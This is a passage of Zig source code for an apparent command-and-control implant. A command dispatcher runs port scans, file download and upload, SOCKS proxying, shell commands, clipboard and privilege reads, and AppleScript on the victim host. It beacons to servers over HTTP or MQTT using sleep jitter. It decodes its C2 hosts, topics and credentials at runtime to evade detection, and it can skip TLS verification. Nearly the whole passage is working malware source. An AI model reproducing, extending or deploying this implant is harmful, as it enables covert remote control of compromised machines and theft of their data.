            ob.cmdHash("jobkill") => if (comptime config.include_jobkill) return self.killJobCmd(aa, p) else return aa.dupe(u8, ""),
            ob.cmdHash("portscan") => if (comptime config.include_portscan) {
                const job_id = self.spawnJob(task.id, "portscan", p) catch |e| {
                    is_error.* = true;
                    return std.fmt.allocPrint(aa, "spawn failed: {s}", .{@errorName(e)});
                };
                return std.fmt.allocPrint(aa, "portscan started (job {d})", .{job_id});
            } else return aa.dupe(u8, ""),
            ob.cmdHash("download") => if (comptime config.include_download) {
                const P = struct { path: []const u8 };
                const parsed = try std.json.parseFromSlice(P, aa, p, .{ .ignore_unknown_fields = true });
                return self.downloadCmd(aa, task.id, parsed.value.path);
            } else return aa.dupe(u8, ""),
            ob.cmdHash("upload") => if (comptime config.include_upload) {
                const P = struct { file: []const u8, path: []const u8 };
                const parsed = try std.json.parseFromSlice(P, aa, p, .{ .ignore_unknown_fields = true });
                return self.uploadCmd(aa, task.id, parsed.value.file, parsed.value.path);
            } else return aa.dupe(u8, ""),
            ob.cmdHash("socks") => if (comptime config.include_socks) return aa.dupe(u8, "socks proxy configured") else return aa.dupe(u8, ""),
            ob.cmdHash("cat") => {
                const r = try cmds.cat(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("run") => {
                const r = try cmds.run(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("mkdir") => {
                const r = try cmds.mkdir(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("cp") => {
                const r = try cmds.cp(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("mv") => {
                const r = try cmds.mv(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("rm") => {
                const r = try cmds.rm(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("find") => {
                const r = try cmds.find(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("sudo") => {
                const r = try cmds.sudo(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("clipboard") => {
                const r = try cmds.clipboard(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("getprivs") => {
                const r = try cmds.getprivs(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("services") => {
                const r = try cmds.services(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("launchctl") => {
                const r = try cmds.launchctl(aa);
                is_error.* = r.is_error;
                return r.output;
            },
            ob.cmdHash("osascript") => {
                const r = try cmds.osascript(aa, p);
                is_error.* = r.is_error;
                return r.output;
            },
            else => {
                is_error.* = true;
                return std.fmt.allocPrint(aa, "unknown command: {s}", .{cmd});
            },
        }
    }

    fn sleepCmd(self: *Agent, aa: std.mem.Allocator, params_json: []const u8) ![]u8 {
        const P = struct { seconds: u32, jitter: u32 = 0 };
        const parsed = try std.json.parseFromSlice(P, aa, params_json, .{ .ignore_unknown_fields = true });
        self.sleep_ms   = @as(u64, parsed.value.seconds) * std.time.ms_per_s;
        self.jitter_pct = parsed.value.jitter;
        return std.fmt.allocPrint(aa, "sleep={d}s jitter={d}%", .{ parsed.value.seconds, self.jitter_pct });
    }

    // -----------------------------------------------------------------------
    // Message format / crypto
    // -----------------------------------------------------------------------

    fn formatMessage(self: *Agent, aa: std.mem.Allocator, uuid: []const u8, json: []const u8) ![]u8 {
        const encrypted = if (comptime !std.mem.eql(u8, config.crypto_type, "none"))
            try crypto.encrypt(aa, self.enc_key.?, json)
        else
            try aa.dupe(u8, json);
        defer if (comptime !std.mem.eql(u8, config.crypto_type, "none")) aa.free(encrypted);

        const raw_len = uuid.len + encrypted.len;
        const raw     = try aa.alloc(u8, raw_len);
        @memcpy(raw[0..uuid.len], uuid);
        @memcpy(raw[uuid.len..], encrypted);

        const b64_len = std.base64.standard.Encoder.calcSize(raw_len);
        const b64     = try aa.alloc(u8, b64_len);
        _ = std.base64.standard.Encoder.encode(b64, raw);
        return b64;
    }

    fn parseResponse(self: *Agent, aa: std.mem.Allocator, uuid: []const u8, raw: []const u8) ![]u8 {
        const decoded_len = try std.base64.standard.Decoder.calcSizeForSlice(raw);
        const decoded     = try aa.alloc(u8, decoded_len);
        try std.base64.standard.Decoder.decode(decoded, raw);

        if (decoded.len < uuid.len) return error.ResponseTooShort;
        const body = decoded[uuid.len..];

        if (comptime !std.mem.eql(u8, config.crypto_type, "none")) {
            return crypto.decrypt(aa, self.dec_key.?, body);
        } else {
            return aa.dupe(u8, body);
        }
    }

    // -----------------------------------------------------------------------
    // Transport dispatch (comptime-selected at build time)
    // -----------------------------------------------------------------------

    fn makeRequest(self: *Agent, aa: std.mem.Allocator, message: []const u8) ![]u8 {
        if (comptime std.mem.eql(u8, config.c2_profile, "http")) {
            return self.makeRequestHttp(aa, message);
        } else {
            return self.makeRequestMqtt(aa, message);
        }
    }

    fn makeRequestMqtt(self: *Agent, aa: std.mem.Allocator, message: []const u8) ![]u8 {
        // Decode MQTT topic strings from obfuscated constants at runtime.
        // config.mqtt_topic/recv_topic/send_topic as literals would sit in .rodata.
        var topic_buf: [ob.e_mqtt_topic.len]u8 = undefined;
        ob.e_mqtt_topic.dec(&topic_buf);
        defer @memset(&topic_buf, 0);

        var recv_sub_buf: [ob.e_mqtt_recv_topic.len]u8 = undefined;
        ob.e_mqtt_recv_topic.dec(&recv_sub_buf);
        defer @memset(&recv_sub_buf, 0);

        var send_sub_buf: [ob.e_mqtt_send_topic.len]u8 = undefined;
        ob.e_mqtt_send_topic.dec(&send_sub_buf);
        defer @memset(&send_sub_buf, 0);

        const recv = try std.fmt.allocPrint(aa, "{s}{s}", .{ &topic_buf, &recv_sub_buf });
        const send = try std.fmt.allocPrint(aa, "{s}{s}", .{ &topic_buf, &send_sub_buf });

        // Try each server: decode address at runtime, skip if empty.
        inline for (.{
            ob.e_mqtt_server_0,
            ob.e_mqtt_server_1,
            ob.e_mqtt_server_2,
            ob.e_mqtt_server_3,
        }) |enc_srv| {
            if (comptime enc_srv.len == 0) continue;
            var srv_buf: [enc_srv.len]u8 = undefined;
            enc_srv.dec(&srv_buf);
            defer @memset(&srv_buf, 0);
            if (self.tryOneMqttServer(aa, recv, send, message, &srv_buf)) |resp| {
                return resp;
            } else |e| {
                dbg("server failed: {s}", .{@errorName(e)});
            }
        }
        return error.NoServers;
    }

    fn tryOneMqttServer(self: *Agent, aa: std.mem.Allocator, recv: []const u8, send: []const u8, message: []const u8, server: []const u8) ![]u8 {
        dbg("MQTT connect port={d}", .{config.mqtt_port});
        const stream = try std.net.tcpConnectToHost(self.allocator, server, config.mqtt_port);
        errdefer stream.close();
        const max_ms = self.sleep_ms + (self.sleep_ms * @as(u64, self.jitter_pct) / 100);
        const tv = std.posix.timeval{ .sec = @intCast(max_ms / std.time.ms_per_s), .usec = 0 };
        std.posix.setsockopt(stream.handle, std.posix.SOL.SOCKET, std.posix.SO.RCVTIMEO, std.mem.asBytes(&tv)) catch {};

        if (comptime config.use_ssl) {
            var bundle = std.crypto.Certificate.Bundle{};
            defer bundle.deinit(self.allocator);
            if (comptime !config.skip_tls_verify) try bundle.rescan(self.allocator);
            const tls_client = try std.crypto.tls.Client.init(stream, .{
                .host = if (comptime config.skip_tls_verify) .no_verification else .{ .explicit = server },
                .ca   = if (comptime config.skip_tls_verify) .no_verification else .{ .bundle = bundle },
            });
            var tls_stream = mqtt.TlsStream{ .tls = tls_client, .stream = stream };
            defer tls_stream.close();
            return self.doExchange(mqtt.TlsStream, &tls_stream, aa, recv, send, message);
        } else {
            var plain = mqtt.PlainStream{ .inner = stream };
            defer plain.close();
            return self.doExchange(mqtt.PlainStream, &plain, aa, recv, send, message);
        }
    }

    fn makeRequestHttp(self: *Agent, aa: std.mem.Allocator, message: []const u8) ![]u8 {
        // Decode HTTP config strings at runtime — host/uri/ua are C2 IOCs.
        var host_buf: [ob.e_http_host.len]u8 = undefined;
        ob.e_http_host.dec(&host_buf);
        defer @memset(&host_buf, 0);

        var uri_buf: [ob.e_http_post_uri.len]u8 = undefined;
        ob.e_http_post_uri.dec(&uri_buf);
        defer @memset(&uri_buf, 0);

        var ua_buf: [ob.e_http_user_agent.len]u8 = undefined;
        ob.e_http_user_agent.dec(&ua_buf);
        defer @memset(&ua_buf, 0);

        dbg("HTTP POST port={d}", .{config.http_port});
        const stream = try std.net.tcpConnectToHost(self.allocator, &host_buf, config.http_port);
        const max_ms = self.sleep_ms + (self.sleep_ms * @as(u64, self.jitter_pct) / 100);
        const tv = std.posix.timeval{ .sec = @intCast(max_ms / std.time.ms_per_s), .usec = 0 };
        std.posix.setsockopt(stream.handle, std.posix.SOL.SOCKET, std.posix.SO.RCVTIMEO, std.mem.asBytes(&tv)) catch {};

        if (comptime config.http_use_ssl) {
            var bundle = std.crypto.Certificate.Bundle{};
            defer bundle.deinit(self.allocator);
            if (comptime !config.skip_tls_verify) try bundle.rescan(self.allocator);
            const tls_client = try std.crypto.tls.Client.init(stream, .{
                .host = if (comptime config.skip_tls_verify) .no_verification else .{ .explicit = &host_buf },
                .ca   = if (comptime config.skip_tls_verify) .no_verification else .{ .bundle = bundle },
            });
            var tls_stream = mqtt.TlsStream{ .tls = tls_client, .stream = stream };
            defer tls_stream.close();
            var client = httpc.Client(mqtt.TlsStream).init(&tls_stream);
            return client.post(aa, &host_buf, config.http_port, &uri_buf, &ua_buf, message);
        } else {
            var plain = mqtt.PlainStream{ .inner = stream };
            defer plain.close();
            var client = httpc.Client(mqtt.PlainStream).init(&plain);
            return client.post(aa, &host_buf, config.http_port, &uri_buf, &ua_buf, message);
        }
    }

    fn doExchange(
        self:       *Agent,
        comptime S: type,
        stream:     *S,
        aa:         std.mem.Allocator,
        recv:       []const u8,
        send:       []const u8,
        message:    []const u8,
    ) ![]u8 {
        _ = self;
        // Decode MQTT credentials at runtime — never sit as plaintext in .rodata.
        var cid_buf: [ob.e_mqtt_client_id.len]u8 = undefined;
        ob.e_mqtt_client_id.dec(&cid_buf);
        defer @memset(&cid_buf, 0);

        var usr_buf: [ob.e_mqtt_user.len]u8 = undefined;
        ob.e_mqtt_user.dec(&usr_buf);
        defer @memset(&usr_buf, 0);

        var pass_buf: [ob.e_mqtt_pass.len]u8 = undefined;
        ob.e_mqtt_pass.dec(&pass_buf);
        defer @memset(&pass_buf, 0);

        var client = mqtt.Client(S).init(stream);
        try client.connect(&cid_buf, &usr_buf, &pass_buf);
        try client.subscribe(recv);
        try client.publish(send, message);
        const response = try client.waitForPublish(aa);
        try client.disconnect();
        return response;
    }

    // -----------------------------------------------------------------------
    // OS helpers
    // -----------------------------------------------------------------------

    fn getHostname(self: *Agent, aa: std.mem.Allocator) []const u8 {
        _ = self;
        if (comptime @import("builtin").os.tag == .windows) {
            return std.process.getEnvVarOwned(aa, "COMPUTERNAME") catch "unknown";
        } else {
            var buf: [std.posix.HOST_NAME_MAX]u8 = undefined;
            const name = std.posix.gethostname(&buf) catch return "unknown";
            return aa.dupe(u8, name) catch "unknown";
        }
    }

    fn getUsername(self: *Agent, aa: std.mem.Allocator) []const u8 {
        _ = self;
        return std.process.getEnvVarOwned(aa, "USER") catch
            std.process.getEnvVarOwned(aa, "USERNAME") catch
            aa.dupe(u8, "unknown") catch "unknown";
    }

    fn getIp(self: *Agent, aa: std.mem.Allocator, hostname: []const u8) []const u8 {
        _ = self;
        const bm = @import("builtin");
        if (comptime bm.os.tag != .windows) {
            const sock = std.posix.socket(std.posix.AF.INET, std.posix.SOCK.DGRAM, 0) catch null;
            if (sock) |s| {
                defer std.posix.close(s);
                const remote = std.posix.sockaddr.in{
                    .family = std.posix.AF.INET,
                    .port   = std.mem.nativeToBig(u16, 53),
                    .addr   = 0x08080808,
                    .zero   = std.mem.zeroes([8]u8),
                };
                if (std.posix.connect(s, @ptrCast(&remote), @sizeOf(@TypeOf(remote)))) {
                    var local: std.posix.sockaddr.in = undefined;
                    var len: std.posix.socklen_t = @sizeOf(@TypeOf(local));
                    if (std.posix.getsockname(s, @ptrCast(&local), &len)) {
                        const b: [4]u8 = @bitCast(local.addr);
                        return std.fmt.allocPrint(aa, "{d}.{d}.{d}.{d}", .{ b[0], b[1], b[2], b[3] }) catch "0.0.0.0";
                    } else |_| {}
                } else |_| {}
            }
        }
        const list = std.net.getAddressList(aa, hostname, 0) catch return "0.0.0.0";
        defer list.deinit();
        for (list.addrs) |addr| {
            const ip = std.fmt.allocPrint(aa, "{}", .{addr}) catch continue;
            const colon = std.mem.lastIndexOfScalar(u8, ip, ':') orelse return ip;
            return ip[0..colon];
        }
        return "0.0.0.0";
    }

    fn getOs(self: *Agent, aa: std.mem.Allocator) []const u8 {
        _ = self;
        const bm = @import("builtin");
        if (comptime bm.os.tag == .linux) {
            const uts     = std.posix.uname();
            const release = std.mem.sliceTo(&uts.release, 0);
            return std.fmt.allocPrint(aa, "Linux {s}", .{release}) catch "Linux";
        } else if (comptime bm.os.tag == .windows) {
            return "Windows";
        } else if (comptime bm.os.tag == .macos) {
            return "macOS";
        } else {
            return "Unknown";
        }
    }
};

// ---------------------------------------------------------------------------
// Background thread: portscan job
// ---------------------------------------------------------------------------

fn portscanJobThread(ctx: *JobCtx) void {
    defer {
        ctx.agent.allocator.free(ctx.params);
        ctx.agent.allocator.destroy(ctx);
    }

    var arena = std.heap.ArenaAllocator.init(ctx.agent.allocator);
    defer arena.deinit();
    const aa = arena.allocator();

    const cancel_flag = &ctx.job.cancel;
    const result = cmds.portscan(aa, ctx.params, cancel_flag) catch |e| blk: {
        break :blk cmds.Result{
            .output    = std.fmt.allocPrint(aa, "portscan error: {s}", .{@errorName(e)}) catch @constCast("error"),
            .is_error  = true,
            .allocator = aa,
        };
    };

    ctx.agent.addPending(ctx.job.task_id, result.output, result.is_error);
    ctx.job.state.store(.done, .release);
}

// ---------------------------------------------------------------------------
// Utility: shift ArrayList left by n bytes
// ---------------------------------------------------------------------------

fn shiftBuf(buf: *std.ArrayList(u8), n: usize) void {
    if (n >= buf.items.len) {
        buf.clearRetainingCapacity();
        return;
    }
    const remaining = buf.items.len - n;
    std.mem.copyForwards(u8, buf.items[0..remaining], buf.items[n..]);
    buf.shrinkRetainingCapacity(remaining);
}

// ---------------------------------------------------------------------------
// JSON helpers
// ---------------------------------------------------------------------------

fn extractJsonStr(aa: std.mem.Allocator, obj: []const u8, key: []const u8) ?[]u8 {
    const kpos  = std.mem.indexOf(u8, obj, key) orelse return null;
    const colon = std.mem.indexOfPos(u8, obj, kpos + key.len, ":") orelse return null;
    const q1    = std.mem.indexOfPos(u8, obj, colon + 1, "\"") orelse return null;
    const q2    = findStrEnd(obj, q1 + 1) orelse return null;
    const raw   = obj[q1 + 1 .. q2];
    return jsonUnescape(aa, raw) catch null;
}

fn extractNumericField(obj: []const u8, key: []const u8) []const u8 {
    const kp = std.mem.indexOf(u8, obj, key) orelse return "0";
    const cp = std.mem.indexOfPos(u8, obj, kp + key.len, ":") orelse return "0";
    var ns = cp + 1;
    while (ns < obj.len and obj[ns] == ' ') ns += 1;
    var ne = ns;
    while (ne < obj.len and obj[ne] >= '0' and obj[ne] <= '9') ne += 1;
    return obj[ns..ne];
}

fn findStrEnd(s: []const u8, from: usize) ?usize {
    var i = from;
    while (i < s.len) : (i += 1) {
        if (s[i] == '\\') { i += 1; continue; }
        if (s[i] == '"')  return i;
    }
    return null;
}

fn findObjEnd(s: []const u8, from: usize) ?usize {
    var depth: usize = 0;
    var in_str = false;
    var i = from;
    while (i < s.len) : (i += 1) {
        if (in_str) {
            if (s[i] == '\\') { i += 1; continue; }
            if (s[i] == '"')  in_str = false;
            continue;
        }
        if (s[i] == '"')  { in_str = true; continue; }
        if (s[i] == '{')  depth += 1;
        if (s[i] == '}') {
            depth -= 1;
            if (depth == 0) return i;
        }
    }
    return null;
}

fn jsonUnescape(aa: std.mem.Allocator, s: []const u8) ![]u8 {
    var buf = std.ArrayList(u8).init(aa);
    var i: usize = 0;
    while (i < s.len) : (i += 1) {
        if (s[i] == '\\' and i + 1 < s.len) {
            i += 1;
            switch (s[i]) {
                '"'  => try buf.append('"'),
                '\\' => try buf.append('\\'),
                '/'  => try buf.append('/'),
                'n'  => try buf.append('\n'),
                'r'  => try buf.append('\r'),
                't'  => try buf.append('\t'),
                else => { try buf.append('\\'); try buf.append(s[i]); },
            }
        } else {
            try buf.append(s[i]);
        }
    }
    return buf.toOwnedSlice();
}

fn jsonEscape(aa: std.mem.Allocator, s: []const u8) ![]u8 {
    var buf = std.ArrayList(u8).init(aa);
    for (s) |c| {
        switch (c) {
            '"'  => try buf.appendSlice("\\\""),
            '\\' => try buf.appendSlice("\\\\"),
            '\n' => try buf.appendSlice("\\n"),
            '\r' => try buf.appendSlice("\\r"),
            '\t' => try buf.appendSlice("\\t"),
            0...8, 11, 12, 14...31 => try buf.writer().print("\\u{x:0>4}", .{c}),
            else => try buf.append(c),
        }
    }
    return buf.toOwnedSlice();
}
